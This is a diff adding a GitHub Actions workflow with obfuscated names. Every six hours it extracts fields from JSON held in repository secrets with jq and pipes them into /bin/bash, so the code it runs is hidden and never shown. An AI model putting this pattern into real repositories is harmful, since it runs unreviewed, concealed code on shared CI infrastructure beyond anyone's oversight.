@@ -1,0 +1,21 @@
+name: huaizhongjiechu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huaizhongjiechu
+        env:
+          osle040: ${{ secrets.osle040 }}
+        run: |
+          echo $osle040 | jq -r .ctvw6 | /bin/bash
+          echo $tg44491 | jq -r .dpmjx14 | /bin/bash
+          echo $fqhsb6077 | jq -r .bfok70909 | /bin/bash
+          echo $lbl18 | jq -r .c74 | /bin/bash
+          echo $hi999 | jq -r .tkpsq102 | /bin/bash
+          echo $dnqk82618 | jq -r .vm63223 | /bin/bash
+
